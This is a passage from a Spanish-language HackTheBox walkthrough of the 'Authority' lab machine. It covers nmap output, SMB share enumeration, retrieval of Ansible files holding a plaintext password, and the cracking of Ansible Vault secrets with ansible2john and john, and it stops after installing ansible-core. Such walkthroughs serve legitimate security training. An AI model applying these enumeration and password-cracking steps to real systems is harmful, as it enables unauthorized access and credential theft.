| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
8443/tcp  open  ssl/https-alt
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>172.16.2.118
| Not valid before: 2024-07-09T02:50:28
|_Not valid after:  2026-07-11T14:28:52
|_http-title: Site doesn<span class="s1">'t have a title (text/html;charset=ISO-8859-1).
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 11 Jul 2024 03:03:52 GMT
|     Connection: close
|     &lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0;URL='</span>/pwm<span class="s1">'"/&gt;&lt;/head&gt;&lt;/html&gt;
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 11 Jul 2024 03:03:50 GMT
|     Connection: close
|     &lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0;URL='</span>/pwm<span class="s1">'"/&gt;&lt;/head&gt;&lt;/html&gt;
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Thu, 11 Jul 2024 03:03:50 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Thu, 11 Jul 2024 03:03:58 GMT
|     Connection: close
|     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400
|     Request&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400
|_    Request&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found in the HTTP protocol [RTSP&amp;#47;1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
59430/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=7/10%Time=668F136A%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/htm
SF:l;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Thu,\x2011\x2
SF:0Jul\x202024\x2003:03:50\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n
SF:\n&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='</span>/pwm<span class="s1">'
SF:\"/&gt;&lt;/head&gt;&lt;/html&gt;")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x
SF:20GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x2
SF:0Thu,\x2011\x20Jul\x202024\x2003:03:50\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\
SF:x20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Th
SF:u,\x2011\x20Jul\x202024\x2003:03:52\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n\n\n\n\n\n&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\"refresh\"\x20content=\"0
SF:;URL='</span>/pwm<span class="s1">'\"/&gt;&lt;/head&gt;&lt;/html&gt;")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20
SF:\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en
SF:\r\nContent-Length:\x201936\r\nDate:\x20Thu,\x2011\x20Jul\x202024\x2003
SF::03:58\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x2
SF:0lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\
SF:x20Request&lt;/title&gt;&lt;style\x20type=\"text/css\"&gt;body\x20{font-family:Taho
SF:ma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgro
SF:und-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px
SF:;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:
SF:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}
SF:&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x
SF:20Request&lt;/h1&gt;&lt;hr\x20class=\"line\"\x20/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;\x20Exception\x2
SF:0Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt;\x20Invalid\x20character\x20found\x20in\x20
SF:the\x20HTTP\x20protocol\x20\[RTSP&amp;#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]&lt;/p&gt;&lt;
SF:p&gt;&lt;b&gt;Description&lt;/b&gt;\x20The\x20server\x20cannot\x20or\x20will\x20not\x2
SF:0process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20p
SF:erceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\
SF:x20request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h59m39s, deviation: 0s, median: 3h59m38s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-07-11T03:04:43
|_  start_date: N/A
</span></code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vamos a comenzar enumerando la máquina ya que tiene muchos puertos abiertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme ldap 10.10.11.222
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar los dominios al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.10.222 authority.htb authority.htb.corp DC.authority.htb dc.authority.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
authority.htb authority.htb.corp DC.authority.htb dc.authority.htb
</code></pre></div></div>

<ul>
  <li>Si enumeramos recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code> vemos los siguientes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.10.11.222

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
	C<span class="nv">$ </span>             Disk      Default share
	Department Shares Disk
	Development     Disk
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.10.11.222 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>Si analizamos el contenido de <code class="language-plaintext highlighter-rouge">Department Shares</code> vemos que no tenemos acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.11.222 <span class="nt">-u</span> <span class="s1">'xd'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-r</span> <span class="s1">'Department Shares'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.10.11.222:445	Name: 10.10.11.222        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	Department Shares                                 	NO ACCESS	
	Development                                       	READ ONLY	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	SYSVOL                                            	NO ACCESS	Logon server share
</code></pre></div></div>

<ul>
  <li>Sin embargo en el recurso <code class="language-plaintext highlighter-rouge">Development</code> si tenemos permisos de lectura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.11.222/Development <span class="nt">-U</span> xd%xd
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:38 2023
  ..                                  D        0  Fri Mar 17 07:20:38 2023
  Automation                          D        0  Fri Mar 17 07:20:40 2023

		5888511 blocks of size 4096. 1132344 blocks available
smb: <span class="se">\&gt;</span> <span class="nb">cd </span>Automation
smb: <span class="se">\A</span>utomation<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:40 2023
  ..                                  D        0  Fri Mar 17 07:20:40 2023
  Ansible                             D        0  Fri Mar 17 07:20:50 2023

		5888511 blocks of size 4096. 1129444 blocks available
smb: <span class="se">\A</span>utomation<span class="se">\&gt;</span> <span class="nb">cd </span>Ansible
smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:50 2023
  ..                                  D        0  Fri Mar 17 07:20:50 2023
  ADCS                                D        0  Fri Mar 17 07:20:48 2023
  LDAP                                D        0  Fri Mar 17 07:20:48 2023
  PWM                                 D        0  Fri Mar 17 07:20:48 2023
  SHARE                               D        0  Fri Mar 17 07:20:48 2023

		5888511 blocks of size 4096. 1185756 blocks available
smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Dentro de Share encontramos otro recurso que se llama <code class="language-plaintext highlighter-rouge">tasks</code> donde encontramos un <code class="language-plaintext highlighter-rouge">.yml</code> vamos a descargarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\&gt;</span> <span class="nb">cd </span>tasks<span class="se">\</span>
smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\t</span>asks<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:48 2023
  ..                                  D        0  Fri Mar 17 07:20:48 2023
  main.yml                            A     1876  Thu Sep 22 01:04:00 2022

		5888511 blocks of size 4096. 1254895 blocks available
smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\t</span>asks<span class="se">\&gt;</span> get main.yml
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\t</span>asks<span class="se">\m</span>ain.yml of size 1876 as main.yml <span class="o">(</span>2.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.1 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\t</span>asks<span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Este es el contenido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>main.yml
    - name: Make subdirectories under Share
      ansible.windows.win_file:
        path: <span class="s2">""</span>
        state: directory
      loop:
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\I</span>T<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\I</span>T<span class="se">\P</span>rivate
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\H</span>R<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\H</span>R<span class="se">\P</span>rivate
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\R</span>&amp;D<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\R</span>&amp;D<span class="se">\P</span>rivate
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\M</span>arketing<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\M</span>arketing<span class="se">\P</span>rivate
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\F</span>inance<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\F</span>inance<span class="se">\P</span>rivate
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\E</span>xecutives<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\E</span>xecutives<span class="se">\P</span>rivate
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\A</span>ccounting<span class="se">\P</span>ublic
        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\A</span>ccounting<span class="se">\P</span>rivate

    - name: Make user folders <span class="k">for </span>all <span class="nb">users
      </span>ansible.windows.win_powershell:
        script: |
          <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"C:</span><span class="se">\S</span><span class="s2">hare</span><span class="se">\"</span><span class="s2">
          </span><span class="nv">$users</span><span class="s2"> = (Get-ADUser -Filter * ).Name
          foreach (</span><span class="nv">$user</span><span class="s2"> in </span><span class="nv">$users</span><span class="s2">) {
            New-Item -ItemType Directory -Force -Path </span><span class="nv">$path</span><span class="se">\$</span><span class="s2">user}

    - name: Create User Share
      win_share:
          name: ''
          description: ''
          path: ''
          list: ''
          full: ''
          read: ''
      with_items:
        - {path: 'C:</span><span class="se">\S</span><span class="s2">hare', share_name: 'User Share', share_description: 'Share for Users', full: 'Administrators, Domain Users', read: 'Domain Users', list: no }

    - name: Enable inherited ACL
      ansible.windows.win_acl_inheritance:
        path: C:</span><span class="se">\S</span><span class="s2">hare
        state: present

    - name: ACL
      ansible.windows.win_acl:
        path: C:</span><span class="se">\S</span><span class="s2">hare
        user: Administrator, Domain Users
        rights: Full Control
        type: 'Allow'
        inherit:  None
        propagation: 'None'
</span></code></pre></div></div>

<blockquote>
  <p>El script de Ansible main.yml está diseñado para automatizar la creación de una estructura de carpetas para distintos departamentos y usuarios en un servidor Windows, así como para configurar los permisos de acceso y compartir el directorio principal C:\Share con los usuarios del dominio y administradores.</p>
</blockquote>

<ul>
  <li>Dentro de <code class="language-plaintext highlighter-rouge">pwn</code> hay varios archivos interesantes donde mencionan mucho ansible vamos a descargarlos para analizarlos mejor en nuestra máquina de atacante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:48 2023
  ..                                  D        0  Fri Mar 17 07:20:48 2023
  ansible.cfg                         A      491  Thu Sep 22 00:36:58 2022
  ansible_inventory                   A      174  Wed Sep 21 17:19:32 2022
  defaults                            D        0  Fri Mar 17 07:20:48 2023
  handlers                            D        0  Fri Mar 17 07:20:48 2023
  meta                                D        0  Fri Mar 17 07:20:48 2023
  README.md                           A     1290  Thu Sep 22 00:35:58 2022
  tasks                               D        0  Fri Mar 17 07:20:48 2023
  templates                           D        0  Fri Mar 17 07:20:48 2023
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span> prompt off
smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span> recurse <span class="nb">true
</span>smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span> mget PWM
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\a</span>nsible.cfg of size 491 as PWM/ansible.cfg <span class="o">(</span>0.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.5 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\a</span>nsible_inventory of size 174 as PWM/ansible_inventory <span class="o">(</span>0.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.4 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\R</span>EADME.md of size 1290 as PWM/README.md <span class="o">(</span>1.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.7 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\d</span>efaults<span class="se">\m</span>ain.yml of size 1591 as PWM/defaults/main.yml <span class="o">(</span>1.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.0 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\h</span>andlers<span class="se">\m</span>ain.yml of size 4 as PWM/handlers/main.yml <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.8 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\m</span>eta<span class="se">\m</span>ain.yml of size 199 as PWM/meta/main.yml <span class="o">(</span>0.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.7 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\t</span>asks<span class="se">\m</span>ain.yml of size 1832 as PWM/tasks/main.yml <span class="o">(</span>1.8 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.8 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\t</span>emplates<span class="se">\c</span>ontext.xml.j2 of size 422 as PWM/templates/context.xml.j2 <span class="o">(</span>0.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.8 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\t</span>emplates<span class="se">\t</span>omcat-users.xml.j2 of size 388 as PWM/templates/tomcat-users.xml.j2 <span class="o">(</span>0.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.8 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Encontramos credenciales <a href="https://www.redhat.com/es/topics/automation/learning-ansible-tutorial">https://www.redhat.com/es/topics/automation/learning-ansible-tutorial</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>ansible_inventory
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore
</code></pre></div></div>

<ul>
  <li>Si las probamos no nos funcionan.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme winrm 10.10.11.222 <span class="nt">-u</span> administrator <span class="nt">-p</span> <span class="s1">'Welcome1'</span>
SMB         10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
HTTP        10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.222:5985/wsman
WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span>-] authority.htb<span class="se">\a</span>dministrator:Welcome1
</code></pre></div></div>

<ul>
  <li>Dentro de <code class="language-plaintext highlighter-rouge">default</code> encontramos lo que parecen ser hashes <a href="https://docs.ansible.com/ansible/latest/vault_guide/vault_encrypting_content.html">https://docs.ansible.com/ansible/latest/vault_guide/vault_encrypting_content.html</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>main.yml
<span class="nt">---</span>
pwm_run_dir: <span class="s2">""</span>

pwm_hostname: authority.htb.corp
pwm_http_port: <span class="s2">""</span>
pwm_https_port: <span class="s2">""</span>
pwm_https_enable: <span class="nb">true

</span>pwm_require_ssl: <span class="nb">false

</span>pwm_admin_login: <span class="o">!</span>vault |
          <span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: <span class="o">!</span>vault |
          <span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: <span class="s2">"DC=authority,DC=htb"</span>
ldap_admin_password: <span class="o">!</span>vault |
          <span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764                         
</code></pre></div></div>

<ul>
  <li>Vemos que nos hablan sobre <code class="language-plaintext highlighter-rouge">pwm_admin_login</code> si buscamos la ruta en la web existe.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/1.png" />
</p>

<ul>
  <li>
    <p>Nos piden credenciales supongo que la contraseña debe ser la del algún vault <a href="https://github.com/pwm-project/pwm">https://github.com/pwm-project/pwm</a>.</p>
  </li>
  <li>
    <p>Vamos generar los hashes con <code class="language-plaintext highlighter-rouge">ansible2john</code> <a href="https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/">https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>vault1
<span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438

❯ <span class="nb">cat </span>vault2
<span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531

❯ <span class="nb">cat </span>vault3
<span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
</code></pre></div></div>

<ul>
  <li>Generamos los hashes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ansible2john vault1
vault1:<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d<span class="k">*</span>e041732f9243ba0484f582d9cb20e148<span class="k">*</span>4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
❯ ansible2john vault2
vault2:<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5<span class="k">*</span>1dff07007e7a25e438e94de3f3e605e1<span class="k">*</span>66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
❯ ansible2john vault3
vault3:<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93<span class="k">*</span>dfd9eec07341bac0e13c62fe1d0a5f7d<span class="k">*</span>d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
</code></pre></div></div>

<ul>
  <li>Si los crackeamos vemos que todos tiene la misma contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts <span class="o">(</span>ansible, Ansible Vault <span class="o">[</span>PBKDF2-SHA256 HMAC-256 512/512 AVX512BW 16x]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 10000 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="o">!</span>@#<span class="nv">$%</span>^&amp;<span class="k">*</span>         <span class="o">(</span>vault2<span class="o">)</span>
<span class="o">!</span>@#<span class="nv">$%</span>^&amp;<span class="k">*</span>         <span class="o">(</span>vault1<span class="o">)</span>
<span class="o">!</span>@#<span class="nv">$%</span>^&amp;<span class="k">*</span>         <span class="o">(</span>vault3<span class="o">)</span>
3g 0:00:00:53 DONE <span class="o">(</span>2024-07-10 17:56<span class="o">)</span> 0.05621g/s 745.8p/s 2237c/s 2237C/s 051790..victor2
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Ahora que tenemos la contraseña podemos hacer el <code class="language-plaintext highlighter-rouge">decrypt</code> al <code class="language-plaintext highlighter-rouge">Vault</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ pipx <span class="nb">install </span>ansible-core
  installed package ansible-core 2.17.1, installed using Python 3.11.9
  These apps are now globally available
    - ansible
    - ansible-config
    - ansible-connection
    - ansible-console
    - ansible-doc
    - ansible-galaxy
    - ansible-inventory
    - ansible-playbook
    - ansible-pull
    - ansible-test
